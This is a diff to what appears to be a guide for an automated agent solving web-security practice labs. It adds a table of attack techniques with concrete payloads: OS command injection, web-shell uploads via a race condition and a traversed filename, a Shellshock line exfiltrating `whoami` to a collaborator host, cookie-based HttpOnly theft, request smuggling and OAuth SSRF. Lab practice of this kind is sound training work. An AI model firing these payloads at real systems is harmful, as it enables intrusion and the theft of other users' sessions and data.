@@ -76,3 +76,23 @@ the flipped flag, not a reportable finding.
 
 Unsure which tool a class maps to → `pick_tool('<class>')`. A public writeup for
 the exact lab → `research_attack_vector`, then adapt (don't fire verbatim).
+
+## Multi-step / raw-socket lab variants (not single-request auto_probe)
+
+These lab techniques need a specific tool or a two-step flow — `auto_probe` alone
+won't confirm them:
+
+| Lab variant | How |
+|---|---|
+| Blind OS cmd injection, output redirection | write via `curl_request` (`| whoami > /var/www/images/x.txt`), then GET that path |
+| Web-shell upload via race condition | `test_race_condition` / `concurrent_requests` flood the uploaded path before the validator deletes it |
+| Web-shell upload via filename traversal | upload `filename="..%2fx.php"`, then GET the traversed path (KB `file_upload.json:filename_path_traversal`) |
+| Cookie sandwich (HttpOnly theft, Tomcat RFC2109) | `send_raw_request` — sandwich the target cookie with `$Version=1` quoted cookies, find a reflection sink |
+| Host-header connection-state routing | `send_raw_request` pipelined: req1 valid Host, req2 attacker Host on the SAME connection |
+| Blind SSRF via Shellshock | inject `() { :; }; nslookup $(whoami).COLLAB` into User-Agent of the SSRF'd internal request; OOB Collaborator |
+| Request smuggling: capture another user's request | `build_capture_smuggle` (size the CL to prefix+victim_total) |
+| HTTP/2 CRLF request splitting (H2.0) | `build_h2_crlf_smuggle` (raw h2 client) |
+| OAuth: implicit-flow client trust / dynamic client registration SSRF | `oauth_flow_simulator`; for reg-SSRF POST `logo_uri`/`jwks_uri`=COLLABORATOR |
+| 2FA identifier swap / email-parser discrepancy | two `session_request` sessions (attacker+victim); swap the account param/cookie |
+
+Confirm the solve the same way: re-fetch the lab root and check the `is-solved` flag.
